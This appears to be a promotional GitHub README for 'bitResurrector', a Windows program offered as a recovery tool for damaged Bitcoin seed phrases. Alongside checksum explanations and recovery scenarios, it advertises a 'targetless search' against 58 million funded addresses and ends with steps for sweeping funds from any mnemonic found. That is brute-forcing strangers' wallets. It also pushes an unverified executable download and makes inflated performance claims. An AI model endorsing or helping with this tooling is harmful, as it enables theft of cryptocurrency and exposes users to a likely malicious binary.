# bitResurrector: Damaged Bitcoin Mnemonic seed phrase Recovery

<p align="center">
  <img src="https://pub-a4b1073f1580450bb819d561a783c78b.r2.dev/seed%20phrase%20cutted-paper.png" alt="bitResurrector Professional Header Banner" width="100%" style="border-radius: 8px;" />
</p>

<p align="center">
  <a href="https://github.com/bitrecoverman/bitresurrector-seed-recovery"><img src="https://img.shields.io/badge/build-passing-brightgreen.svg" alt="Build Status: Passing" /></a>
  <a href="https://github.com/bitrecoverman/bitresurrector-seed-recovery/releases/latest"><img src="https://img.shields.io/badge/release-v3.0.3-blue.svg" alt="Latest Release" /></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/License-MIT-green.svg" alt="License: MIT" /></a>
  <a href="https://bitcoinrecovery.site/"><img src="https://img.shields.io/badge/platform-Windows%20x64-lightgrey.svg" alt="Platform: Windows x64" /></a>
  <a href="docs/ARCHITECTURE.md"><img src="https://img.shields.io/badge/acceleration-AVX2%20%7C%20CUDA%20%7C%20OpenCL-orange.svg" alt="Hardware Acceleration" /></a>
  <a href="https://bitcoinrecovery.site/"><img src="https://img.shields.io/badge/website-bitcoinrecovery.site-blueviolet.svg" alt="Official Website" /></a>
</p>

---

## Executive overview

According to on-chain analytics data from Glassnode and Chainalysis, between 3 and 4 million bitcoins remain dormant on unspent transaction outputs (UTXOs). The vast majority of these assets are not lost due to mathematical flaws in secp256k1 or cryptographic breakthroughs in SHA-256. Instead, they are locked because of physical storage media degradation and everyday human transcription errors: torn paper backup cards, ink smudges from moisture, circular metal rings without start marks, or unnumbered multi-column lists.

Standard wallet implementations (Electrum, Sparrow, Trezor Suite) enforce strict binary validation: if a single character is altered or the checksum word fails, the wallet halts execution with a generic error: "Invalid mnemonic checksum".

**bitResurrector Professional v3.0.3** is an industrial-grade cryptographic workstation framework engineered for high-performance reconstruction of forgotten, damaged, partial, or scrambled 12-word Bitcoin mnemonic phrases across **BIP-39**, **BIP-84**, **BIP-86 (Taproot)**, **BIP-49**, and **Electrum v1/v2** standards with zero network exposure.

* **Official Website:** [https://bitcoinrecovery.site/](https://bitcoinrecovery.site/)
* **Standalone Installer Download:** [GitHub Releases (.exe)](https://github.com/bitrecoverman/bitresurrector-seed-recovery/releases/latest)
* **Technical Documentation:** [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) | [docs/MATHEMATICAL_SPECIFICATIONS.md](docs/MATHEMATICAL_SPECIFICATIONS.md)

---

## Video demonstration

Watch the complete live execution of bitResurrector v3.0.3 performing mnemonic constraint solving, permutation streaming, and memory-mapped address validation on consumer hardware:

<p align="center">
  <a href="https://pub-a4b1073f1580450bb819d561a783c78b.r2.dev/Bitresurrector%20Review.mp4" target="_blank">
    <img src="https://pub-a4b1073f1580450bb819d561a783c78b.r2.dev/partial-lost-seedphrase.jpg" alt="Click to Watch Demonstration Video" width="85%" style="border-radius: 8px; border: 1px solid #333;" />
  </a>
  <br />
  <a href="https://pub-a4b1073f1580450bb819d561a783c78b.r2.dev/Bitresurrector%20Review.mp4"><b>▶ Click here to view the full demonstration video (MP4)</b></a>
</p>

---

## Core architectural principles

```
[Raw Physical Input / Degradation]
                │
                ▼
┌──────────────────────────────────────────────────────────┐
│   1. Positional Constraint & Regex Filter Layer          │
│   (12-Slot Visual Grid, Length Masks, Typo Correction)   │
└───────────────────────────────┬──────────────────────────┘
                                │
                                ▼
┌──────────────────────────────────────────────────────────┐
│   2. Early Bitwise SIMD Checksum Barrier (AVX2 / SIMD)   │
│   • BIP-39: Rejects 93.75% of non-viable candidates      │
│   • Electrum v2: Rejects 99.6% via HMAC-SHA512 Prefix    │
└───────────────────────────────┬──────────────────────────┘
                                │ (Only surviving candidates)
                                ▼
┌──────────────────────────────────────────────────────────┐
│   3. High-Throughput PBKDF2 & secp256k1 Derivation Engine│
│   (Multi-Core AVX2 CPU Workers + NVIDIA CUDA / OpenCL)   │
└───────────────────────────────┬──────────────────────────┘
                                │
                                ▼
┌──────────────────────────────────────────────────────────┐
│   4. Autonomous O(1) In-Memory Bloom Filter Matrix       │
│   (256MB Local RAM, 58000000 Funded Addresses, < 40ns)   │
└───────────────────────────────┬──────────────────────────┘
                                │
                                ▼
┌──────────────────────────────────────────────────────────┐
│   5. 40-Address Deep Scan Gap Limit Verification         │
│   (20 External Receiving + 20 Internal Change Addresses) │
└──────────────────────────────────────────────────────────┘
```

### 1. The BIP-39 16x bitwise checksum acceleration
Under BIP-39, a 12-word phrase encapsulates 128 bits of entropy plus 4 bits of checksum:

```text
Total bits = 128 (entropy) + (128 / 32) (checksum) = 132 bits
```

The 132 bits are sliced into 12 segments of 11 bits each (2^11 = 2048), indexing words in the standardized dictionary:
* Words 1 through 11 encode 121 bits of pure entropy.
* Word 12 encodes the remaining 7 bits of entropy and the 4-bit checksum.
* The 4-bit checksum is calculated as the high nibble of SHA-256(Entropy_128).

Because the checksum is strictly deterministic, exactly:

```text
1 / (2^4) = 1 / 16 = 6.25%
```

of theoretical 12th words satisfy the checksum for any given 128-bit prefix. The remaining 93.75% (15 out of 16 candidates) violate the checksum rule.

When two words are missing at the end of a phrase, the unconstrained dictionary space is:

```text
2048 * 2048 = 4194304 word pairs
```

By checking the 4-bit SHA-256 checksum in CPU registers via AVX2 vectorization, bitResurrector reduces these 4194304 pairs to exactly 262144 valid phrases in fractions of a second, discarding 3932160 non-viable phrases without running key derivation.

### 2. Electrum Modern v2 256x prefix filter
Electrum v2 modern seeds compute an HMAC-SHA512 digest:

```text
Digest = HMAC-SHA512(Key = "Seed version", Data = Phrase)
```

The resulting 512-bit digest must satisfy specific hexadecimal prefix criteria:
* **Native SegWit (bc1q...):** Hex digest starts with `100` (byte 0 is `0x10`, high nibble of byte 1 is `0x00`).
* **Standard Legacy (1...):** Hex digest starts with `01` (byte 0 is `0x01`).

This prefix requirement enforces an early rejection rate of 255 / 256 ≈ 99.6%. Out of 4194304 dictionary pairs, only approximately 16000 candidates yield a valid Electrum SegWit prefix.

### 3. The streaming 12! permutation anagram solver
When all 12 words are preserved but their spatial order is completely scrambled, the search space equals:

```text
12! = 479001600 permutations
```

Testing 479001600 permutations through full PBKDF2 would take over 100 hours. bitResurrector streams permutations in L1/L2 cache and verifies checksum words in SIMD registers, discarding over 449000000 permutations in nanoseconds. The entire 12! space is traversed in 1 to 2 hours on a desktop PC.

---

## 7 Physical disaster recovery scenarios

Below is an exhaustive breakdown of 7 real-world physical failure scenarios affecting mnemonic storage media and their mathematical resolutions:

### Case 01: Torn paper edge (missing final two words 11 and 12)

<p align="center">
  <img src="https://pub-27307244770c4d7abb0124f8f0731466.r2.dev/case-01.jpg" alt="Case 01: Torn paper edge" width="650px" style="border-radius: 8px;" />
</p>

* **Physical Incident:** A paper backup sheet stored inside a document sleeve suffered accidental mechanical tearing along the lower margin. Words 1 through 10 remain legible, but slots 11 and 12 were severed and lost.
* **Combinatorial Space:** 4194304 dictionary pairs.
* **Mathematical Resolution:** Slots 1 to 10 are fixed in the positional interface, leaving slots 11 and 12 empty. The bitwise checksum engine narrows the pool to 262144 valid BIP-39 phrases and 16000 Electrum phrases. On an 8-core CPU or an RTX GPU, the solution is identified within 1.5 to 4 seconds.

### Case 02: Fluid stain (word 7 blurred, initial letter and character length known)

<p align="center">
  <img src="https://pub-27307244770c4d7abb0124f8f0731466.r2.dev/case-02.jpg" alt="Case 02: Coffee stain" width="650px" style="border-radius: 8px;" />
</p>

* **Physical Incident:** Liquid spilled on a backup card dissolved the ink in slot 7 into a smudge. Optical examination under light shows the leading letter `p` and an overall span of 6 characters.
* **Combinatorial Space:** In the BIP-39 dictionary, 156 words begin with `p`, and exactly 38 contain 6 letters.
* **Mathematical Resolution:** Entering `p*****` into slot 7 instantly restricts that position to the 38 viable words. Checksum validation leaves only 2 or 3 complete phrases. Total execution runtime is less than 0.05 seconds.

### Case 03: Circular steel washer (endless ring with unknown start index)

<p align="center">
  <img src="https://pub-27307244770c4d7abb0124f8f0731466.r2.dev/case-03.jpg" alt="Case 03: Circular steel disc" width="650px" style="border-radius: 8px;" />
</p>

* **Physical Incident:** Words were punched around the perimeter of a stainless steel washer for fire protection, but the owner omitted an index mark indicating which word starts the sequence.
* **Combinatorial Space:** Cyclic group of order 12 (N = 12 rotational candidates).
* **Mathematical Resolution:** Words are entered sequentially as read clockwise, and circular rotation mode is engaged. The engine evaluates checksums across all 12 shifts. Typically, only a single orientation satisfies the cryptographic checksum. Total runtime is 0.002 seconds.

### Case 04: Two-column notebook layout 2x6 (row-wise vs column-wise ambiguity)

<p align="center">
  <img src="https://pub-27307244770c4d7abb0124f8f0731466.r2.dev/case-04.jpg" alt="Case 04: Two-column layout" width="650px" style="border-radius: 8px;" />
</p>

* **Physical Incident:** 12 words were recorded across two parallel vertical columns of 6 rows without index numbering. The owner cannot recall whether the list was written horizontally (row 1: words 1 and 2) or vertically (left column: words 1-6, right column: words 7-12).
* **Combinatorial Space:** Bounded ambiguity with 2^6 = 64 possible reading trajectories.
* **Mathematical Resolution:** Two-column solver evaluates both primary paths and all alternating row permutations simultaneously, identifying the correct wallet in under 1 millisecond.

### Case 05: Charred paper note (burn holes, prefixes, and character counts)

<p align="center">
  <img src="https://pub-27307244770c4d7abb0124f8f0731466.r2.dev/case-05.jpg" alt="Case 05: Charred note" width="650px" style="border-radius: 8px;" />
</p>

* **Physical Incident:** A paper note survived fire exposure: word 3 was incinerated, word 7 displays only the starting letter `s`, and word 9 shows the embedded fragment `th`.
* **Combinatorial Space:** Unconstrained multi-slot wildcard space exceeding 16500000 theoretical combinations.
* **Mathematical Resolution:** Positional constraints are assigned: slot 3 is blank, slot 7 receives `s*`, and slot 9 receives `*th*`. Dictionary sub-filtering discards non-matching words in L1 cache before cryptographic derivation, solving the phrase in seconds.

### Case 06: Handwriting ambiguity, ink bleeding, and phonetic typos

<p align="center">
  <img src="https://pub-27307244770c4d7abb0124f8f0731466.r2.dev/case-06.jpg" alt="Case 06: Illegible handwriting" width="650px" style="border-radius: 8px;" />
</p>

* **Physical Incident:** Written hastily in cursive: word 3 looks like either `cave` or `wave`, word 7 contains the non-standard phonetic spelling `colomn`, and word 10 has an unreadable trailing character.
* **Combinatorial Space:** Disambiguating handwriting errors and non-dictionary typos.
* **Mathematical Resolution:** Integrated fuzzy matching based on Levenshtein distance maps `colomn` to dictionary entry `column` and evaluates the dual hypothesis `cave/wave` against checksum requirements automatically.

### Case 07: Four-piece unruled fold split along creases

<p align="center">
  <img src="https://pub-27307244770c4d7abb0124f8f0731466.r2.dev/case-07.png" alt="Case 07: Unruled paper fold wear" width="650px" style="border-radius: 8px;" />
</p>

* **Physical Incident:** A plain white sheet carried in a personal wallet fractured along cross-fold creases into 4 distinct quadrants. Each piece holds 3 words, but spatial relationships between quadrants were lost.
* **Combinatorial Space:** Permuting 4 blocks of 3 words (4! = 24 macro-permutations, expanding to 1728 variants with internal adjustments).
* **Mathematical Resolution:** Block permutation module reconstructs complete 12-word strings from 3-word chunks. Checksum validation eliminates non-viable block combinations in 0.05 seconds.

---

## O(1) Memory-mapped Bloom filter architecture

Querying candidate addresses over the internet via remote HTTP endpoints (Blockchain.info, Blockstream, Mempool) creates severe latency bottlenecks and exposes wallet restoration activity to third-party observers.

bitResurrector eliminates this exposure via an autonomous in-memory Bloom filter (`bloom_sys_core_v3.cache`):

* **Memory Allocation:** Exactly 256MB of local RAM (2^31 bits).
* **Indexed Database:** Over 58000000 Bitcoin addresses holding unspent balances across all standard formats (Legacy P2PKH, SegWit P2WPKH, Taproot P2TR, Nested SegWit P2SH).
* **Lookup Velocity:** Algorithmic complexity of O(1) with query latency under 40 nanoseconds per address.
* **Air-Gap Operational Security:** The recovery workstation operates completely offline. No keys, hashes, or addresses ever leave volatile memory.

---

## 40-Address Deep Scan architecture (Gap Limit handling)

Basic recovery scripts derive solely the primary receiving address at index 0 (`m/.../0/0`).

In real-world Bitcoin transactions, funds are frequently distributed across secondary indices:
* An outgoing transaction routed change back to an internal change address along path `m/.../1/0`.
* The user generated several consecutive invoices, depositing funds on secondary indices like `m/.../0/3` or `m/.../0/5`.

Tools checking only index 0 report a false negative (0 balance) and discard the genuine seed phrase.

bitResurrector deploys a **40-Address Deep Scan architecture** per candidate phrase:
* **20 external receiving addresses:** `m/.../0/0` through `m/.../0/19`.
* **20 internal change addresses:** `m/.../1/0` through `m/.../1/19`.
* Evaluates up to 240 addresses simultaneously per candidate mnemonic across all derivation standards without throughput degradation.

---

## Performance benchmark table

| Search Scenario | Search Space | BTCRecover (Python) | bitResurrector CPU (AVX2) | bitResurrector GPU (CUDA/OpenCL) |
| :--- | :--- | :--- | :--- | :--- |
| **Missing 1 Word** | 2048 words | 1.8 seconds | < 0.01 seconds | < 0.001 seconds |
| **Missing 2 Words** | 4194304 word pairs | 58 minutes | 3.5 seconds | 1.2 seconds |
| **Circular Shift (Disc)** | 12 rotations | 0.05 seconds | < 0.002 seconds | < 0.001 seconds |
| **Adjacent Swaps (6 pairs)** | 64 combinations | 0.25 seconds | < 0.01 seconds | < 0.002 seconds |
| **Two-Column 2x6 Reading** | 64 trajectories | 0.25 seconds | < 0.01 seconds | < 0.002 seconds |
| **Scrambled Order (12!)** | 479001600 permutations | > 110 hours | 2.5 hours | 1.1 hours |

---

## Comprehensive recovery software comparison

| Evaluation Criteria | AI Seed Phrase Finder | BitResurrector v3.0.3 | BTCRecover | BIP39-Recoverer (Coinplate) | Seed Saviour (ZenGo-X) | Profanity / Hashcat |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| **Efficiency Rating** | **100 / 100** | **92 / 100** | **58 / 100** | **42 / 100** | **35 / 100** | **25 / 100** |
| **Interface Usability** | 3-field AI dashboard | 12-slot visual grid GUI | CLI console | Basic browser form | Minimal web script | Raw mask CLI |
| **Dependencies** | Turnkey cloud | Standalone C++/ASM | Python, Git, MSVC | Web browser | Web browser | GPU toolchains |
| **Key Isolation** | AES-256 GCM | Local RAM Air-gap | Local workstation | Browser DOM risk | Browser DOM risk | Local workstation |
| **Missing Word Depth** | Up to 6-7 words | Up to 3-4 words | Up to 2 words | Strictly 1 word | Strictly 1 word | Not applicable |
| **Targetless Search** | Supported | Supported (58000000 UTXOs) | Not supported | Not supported | Not supported | Not supported |
| **Scrambled Order (12!)** | 1 to 2 hours (cluster) | 1 to 2 hours (AVX2/GPU) | Partial anchors only | Not supported | Not supported | Not supported |
| **Standards Breadth** | BIP-39, Electrum v1/v2 | BIP-39, Electrum v1/v2 | BIP-39, Electrum v1/v2 | BIP-39 only | BIP-39 only | Raw keys only |
| **Derivation Depth** | Depth 40 to 100 | Depth 40 (expandable to 100) | 1 address default | 1 address | 0 addresses | 1 address |
| **Speed on Consumer PC** | Cloud cluster scale | 700000 c/s CPU, 5M c/s GPU | 1200 - 4500 c/s | 150 - 300 c/s | 50 - 100 c/s | Raw hashes only |

---

## Quick start: open-source developer tools

This repository includes open-source Python CLI tools in the `/tools` directory:

### 1. Verify Electrum v2 or BIP-39 checksums
```bash
python tools/mnemonic_checksum.py "click bus script make all record tomorrow fringe speed lobster judge garment"
```

### 2. Solve circular shifts (12 rotations)
```bash
python tools/cyclic_shift_resolver.py garment click bus script make all record tomorrow fringe speed lobster judge
```

### 3. Solve adjacent pairwise swaps (64 combinations)
```bash
python tools/pairwise_swap_solver.py bus click script make record all tomorrow fringe speed lobster garment judge
```

### 4. Run automated test suite
```bash
python -m unittest discover -s tests
```

---

## Reclaiming recovered funds via Electrum Wallet

Following successful identification of a funded mnemonic phrase or private key in bitResurrector:

1. Download official Electrum from [electrum.org](https://electrum.org).
2. Select **File** -> **New/Restore** -> **Standard wallet** -> **I already have a seed**.
3. Input the 12 recovered words.
4. **Important for BIP-39 phrases:** Open **Options** and check **BIP39 seed**.
5. Select the script format matching your address (Native SegWit `p2wpkh` for `bc1q...` or Legacy `p2pkh` for `1...`).
6. For private keys, navigate to **Import Bitcoin addresses or private keys** and prepend `p2wpkh:` for SegWit.
7. Broadcast a transaction sweeping funds to newly generated cold storage.

---

## Binary verification

Before running the standalone setup package, verify cryptographic hashes:

* **Package:** `bitResurrector_Pro.exe`
* **Size:** 41742723 bytes
* **MD5:** `8d9a9c771bb4876366cab1f398759f7d`
* **SHA-1:** `e86b2f0c65a00cdb1f7fbb505a917e72b3a18d7b`
* **SHA-256:** `92cc0a78c818ed8a1a39d4da8ebb7fe2bc03fe8422d764023d7b753ad500a1d4`

Verification command in Windows PowerShell:
```powershell
Get-FileHash -Path "bitResurrector_Pro.exe" -Algorithm SHA256
```

---

## License & security policy

* **Software License:** Licensed under the [MIT License](LICENSE).
* **Security Policy:** Read our responsible disclosure guidelines in [SECURITY.md](SECURITY.md).
* **Official Homepage:** [https://bitcoinrecovery.site/](https://bitcoinrecovery.site/)
